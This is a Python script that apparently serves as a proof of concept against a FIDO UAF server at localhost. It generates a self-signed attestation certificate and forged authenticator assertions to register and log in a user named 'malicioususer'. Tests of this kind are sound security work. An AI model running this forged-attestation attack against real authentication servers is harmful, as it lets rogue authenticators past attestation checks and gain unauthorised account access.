import base64
import bcrypt
import datetime
import hashlib
import json
import pprint
import requests
import struct

from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID

SERVER_URL = "http://localhost:8080"
ENDPOINT_AUTH_REQ = "/fidouaf/v1/public/authRequest/{appId}"
ENDPOINT_AUTH_RESP = "/fidouaf/v1/public/authResponse"
ENDPOINT_FACETS = "/fidouaf/v1/public/uaf/facets"
ENDPOINT_REG_REQ = "/fidouaf/v1/public/regRequest/{username}/{aaid}"
ENDPOINT_REG_RESP = "/fidouaf/v1/public/regResponse"

ASSERTION_SCHEME = "UAFV1TLV"
KEY_ID = "malicious-user-key"

AAID = "EBA0#0001"
USERNAME = "malicioususer"

class AuthenticatorContext(object):
	"""
	Encapsulates an authenticator's attestation certificate and keypair.
	"""
	def __init__(self):
		# Generate keys.
		self.privateKey = ec.generate_private_key(ec.SECP256R1(), default_backend())
		self.publicKey = self.privateKey.public_key()
		self.certificate = self.generateCertificate()
		# Initialize counters.
		self.sigCount = 0
		self.regCount = 0
		
	def generateCertificate(self):
		issuer = x509.Name([
		    x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
		    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
		    x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
		    x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"My Company"),
		    x509.NameAttribute(NameOID.COMMON_NAME, u"mysite.com"),
		])
		
		cert = x509.CertificateBuilder().subject_name(
			issuer
		).issuer_name(
			issuer
		).public_key(
			self.publicKey
		).serial_number(
			x509.random_serial_number()
		).not_valid_before(
			datetime.datetime.utcnow()
		).not_valid_after(
			datetime.datetime.utcnow() + datetime.timedelta(days=10)
		).add_extension(
			x509.SubjectAlternativeName([x509.DNSName(u"localhost")]),
    			critical=False,
		# Sign our certificate with our private key
		).sign(self.privateKey, hashes.SHA256(), default_backend())
		
		return cert

class Authenticator(object):
	"""
	Abstraction of a UAF UAFV1TLV-compliant authenticator for registration.
	
	We override this class to make concrete authenticators.
	"""
	TAG_UAFV1_REG_ASSERTION      = 0x3E01
	TAG_UAFV1_AUTH_ASSERTION     = 0x3E02
	TAG_UAFV1_KRD                = 0x3E03
	TAG_UAFV1_SIGNED_DATA        = 0x3E04
	TAG_ATTESTATION_CERT         = 0x2E05
	TAG_SIGNATURE                = 0x2E06
	TAG_ATTESTATION_BASIC_FULL   = 0x3E07
	TAG_TRANSACTION_CONTENT_HASH = 0x2E10
	TAG_AAID                     = 0x2E0B
	TAG_ASSERTION_INFO           = 0x2E0E
	TAG_AUTHENTICATOR_NONCE      = 0x2E0F
	TAG_KEYID                    = 0x2E09
	TAG_FINAL_CHALLENGE          = 0x2E0A
	TAG_PUB_KEY                  = 0x2E0C
	TAG_COUNTERS                 = 0x2E0D
	
	UAF_ALG_SIGN_SECP256R1_ECDSA_SHA256_RAW = 0x01
	UAF_ALG_KEY_ECC_X962_RAW =                0x100
		
	def formatTag(self, id, data):
		"""
		Formats a single tag into a byte array.
		
		The data must be a byte array as well.
		
		Args:
			id: a two byte integer representing the tag's type ID.
			data: a binary array of data to encapsulate in the tag.
		"""
		tag = bytearray()
		tag += id.to_bytes(2, "little")
		tag += len(data).to_bytes(2, "little")
		tag += data
		return tag

	def getAssertion(self, aaid, fc):
		pass

class AuthAuthenticator(Authenticator):
	"""
	Authenticator for asserting an authentication request.
	"""
	def __init__(self, context):
		self.context = context
	
	def getAssertion(self, aaid, fc):
		assertion = bytearray()
		assertion += self.formatTag(self.TAG_UAFV1_AUTH_ASSERTION, self.getAuthAssertion(aaid, fc))
		
		return assertion
		
	def getAuthAssertion(self, aaid, fc):
		assertion = bytearray()
		
		signedData = self.getSignedData(aaid, fc)
		assertion += self.formatTag(self.TAG_UAFV1_SIGNED_DATA, signedData)
		
		signature = self.context.privateKey.sign(assertion, ec.ECDSA(hashes.SHA256()))
		assertion += self.formatTag(self.TAG_SIGNATURE, signature)		
		
		return assertion
			
	def getSignedData(self, aaid, fc):
		signedData = bytearray()
		
		# AAID
		signedData += self.formatTag(self.TAG_AAID, bytearray(aaid, "utf-8"))
		
		# Assertion Info
		assertionInfo = bytearray()
		assertionInfo += 0x0.to_bytes(2, "big") # Vendor assigned authenticator version.
		assertionInfo += 0x1.to_bytes(1, "big") # Authentication mode. Must be 0x01 for authentication.
		assertionInfo += self.UAF_ALG_SIGN_SECP256R1_ECDSA_SHA256_RAW.to_bytes(2, "little")
		signedData += self.formatTag(self.TAG_ASSERTION_INFO, assertionInfo)
		
		# Authentication Nonce
		m = hashlib.sha256()
		m.update(bcrypt.gensalt())
		nonce = m.digest()
		signedData += self.formatTag(self.TAG_AUTHENTICATOR_NONCE, nonce)
		
		# Final Challenge
		signedData += self.formatTag(self.TAG_FINAL_CHALLENGE, fc)
		
		# Transaction Content Hash
		signedData += self.formatTag(self.TAG_TRANSACTION_CONTENT_HASH, "".encode("utf-8"))
		
		# Key ID
		signedData += self.formatTag(self.TAG_KEYID, bytearray(KEY_ID, "utf-8"))
		
		# Counters
		counters = bytearray()
		counters += self.context.sigCount.to_bytes(4, "big")
		counters += self.context.regCount.to_bytes(4, "big")
		signedData += self.formatTag(self.TAG_COUNTERS, counters) 

		return signedData

class RegistrationAuthenticator(Authenticator):
	"""
	Authenticator for attesting a registration.
	"""
	def __init__(self, context):
		"""
		Initializes a new authenticator.
		
		Args:
			context: an initalized AuthenticatorContext object.
		"""
		self.context = context

	def getAssertion(self, aaid, fc):
		attestation = bytearray()
		# Build the assertion.
		assertion = self.getRegAssertion(aaid, fc)
		attestation += self.formatTag(self.TAG_UAFV1_REG_ASSERTION, assertion)
		return attestation
		
	def getRegAssertion(self, aaid, fc):
		"""
		Returns the registration assertion tag.
		"""
		regAssert = bytearray()
		signedData = self.formatTag(self.TAG_UAFV1_KRD, self.getSignedData(aaid, fc))
		regAssert += signedData
		
		regAssert += self.formatTag(self.TAG_ATTESTATION_BASIC_FULL, self.getAttestationBasicFull(signedData))
		return regAssert
	
	def getAttestationBasicFull(self, signedData):
		abf = bytearray()
		
		signature = self.context.privateKey.sign(signedData, ec.ECDSA(hashes.SHA256()))
		abf += self.formatTag(self.TAG_SIGNATURE, signature)
		
		cert = self.context.certificate.public_bytes(serialization.Encoding.DER)
		abf += self.formatTag(self.TAG_ATTESTATION_CERT, cert)
		
		return abf
	
	def getSignedData(self, aaid, fc):
		"""
		Returns the signed portion of the blah.
		"""
		signedData = bytearray()
		
		# AAID
		signedData += self.formatTag(self.TAG_AAID, bytearray(aaid, "utf-8"))
		
		# Assertion Info
		assertionInfo = bytearray()
		assertionInfo += 0x0.to_bytes(2, "big") # Vendor assigned authenticator version.
		assertionInfo += 0x01.to_bytes(1, "big") # Authentication mode. Must be 0x01 for registration.
		assertionInfo += self.UAF_ALG_SIGN_SECP256R1_ECDSA_SHA256_RAW.to_bytes(2, "little")
		assertionInfo += self.UAF_ALG_KEY_ECC_X962_RAW.to_bytes(2, "little")
		signedData += self.formatTag(self.TAG_ASSERTION_INFO, assertionInfo)
		
		# Final Challenge
		signedData += self.formatTag(self.TAG_FINAL_CHALLENGE, fc)
		
		# Key ID
		signedData += self.formatTag(self.TAG_KEYID, bytearray(KEY_ID, "utf-8"))
		
		# Counters
		counters = bytearray()
		counters += self.context.sigCount.to_bytes(4, "big")
		counters += self.context.regCount.to_bytes(4, "big")
		signedData += self.formatTag(self.TAG_COUNTERS, counters) 
		
		# Pub Key
		keydata = self.context.publicKey.public_bytes(encoding=serialization.Encoding.DER, format=serialization.PublicFormat.SubjectPublicKeyInfo)
		signedData += self.formatTag(self.TAG_PUB_KEY, keydata)
		
		return signedData

def main():
	authContext = AuthenticatorContext()
	
	registerAuthenticator(authContext)
	authenticate(authContext)

def registerAuthenticator(authContext):
	resp = requests.get(SERVER_URL + ENDPOINT_REG_REQ.format(username=USERNAME, aaid=AAID))
	data = json.loads(resp.text) 
	
	# Process the response.
	# The response comes in a list, so we extract the dictionary at index 0.
	header, challenge, username, policy = unpackRequest(data[0])
	appID = header["appID"]
	print(header, appID)
	fcp = getFinalChallengeParameters(appID, challenge)
	fc = getFinalChallenge(fcp)
	
	auth = RegistrationAuthenticator(authContext)
	attestation = auth.getAssertion(AAID, fc)
	attestation = base64.urlsafe_b64encode(attestation)
	
	# print(data)
	
	regresp = dict()
	regresp["header"] = header
	regresp["fcParams"] = base64.urlsafe_b64encode(json.dumps(fcp).encode("utf-8"))
	regresp["assertions"] = [dict(assertionScheme=ASSERTION_SCHEME, assertion=attestation)]
	regresp = [regresp] # We expect a list.
	
	# Respond.
	print("Registering authenticator...")
	resp = requests.post(SERVER_URL + ENDPOINT_REG_RESP, json=regresp)
	print(resp, resp.text)

def authenticate(authContext):
	resp = requests.get(SERVER_URL + ENDPOINT_AUTH_REQ.format(appId=AAID))
	data = json.loads(resp.text)
	
	header, challenge, username, policy = unpackRequest(data[0])
	appID = header["appID"]	
	fcp = getFinalChallengeParameters(appID, challenge)
	fc = getFinalChallenge(fcp)
	
	# Authenticate Step
	auth = AuthAuthenticator(authContext)
	attestation = auth.getAssertion(AAID, fc)
	attestation = base64.urlsafe_b64encode(attestation)

	authresp = dict()
	authresp["header"] = header
	authresp["fcParams"] = base64.urlsafe_b64encode(json.dumps(fcp).encode("utf-8"))
	authresp["assertions"] = [dict(assertionScheme=ASSERTION_SCHEME, assertion=attestation)]
	authresp = [authresp]
	
	print("Authenticating...")
	resp = requests.post(SERVER_URL + ENDPOINT_AUTH_RESP, json=authresp)
	print(resp, resp.text)

def unpackRequest(data):
	"""
	Extracts and returns the tuple (header, challenge, username, policy) from
	a registration request dictionary.
	"""
	header = data.get("header")
	challenge = data.get("challenge")
	username = data.get("username")
	policy = data.get("policy")
	return header, challenge, username, policy

def getFinalChallenge(fcp):
	"""
	Returns the final challenge, a hash of the final challenge parameters.
	"""
	m = hashlib.sha256()
	m.update(base64.urlsafe_b64encode(json.dumps(fcp).encode("utf-8")))
	return m.digest()

def getFinalChallengeParameters(appID, challenge):
	"""
	Returns a dictionary expressing the final challenge parameters.
	"""
	fcp = dict()
	fcp["appID"] = appID
	fcp["challenge"] = challenge
	fcp["facetID"] = ""
	fcp["channelBinding"] = getChannelBinding()
	return fcp
	
def getChannelBinding():
	'''Returns an empty channel binding object.'''
	binding = dict()
	binding["serverEndPoint"] = ""
	binding["tlsServerCertificate"] = ""
	binding["tlsUnique"] = ""
	binding["cid_pubkey"] = ""
	return binding
	
main()

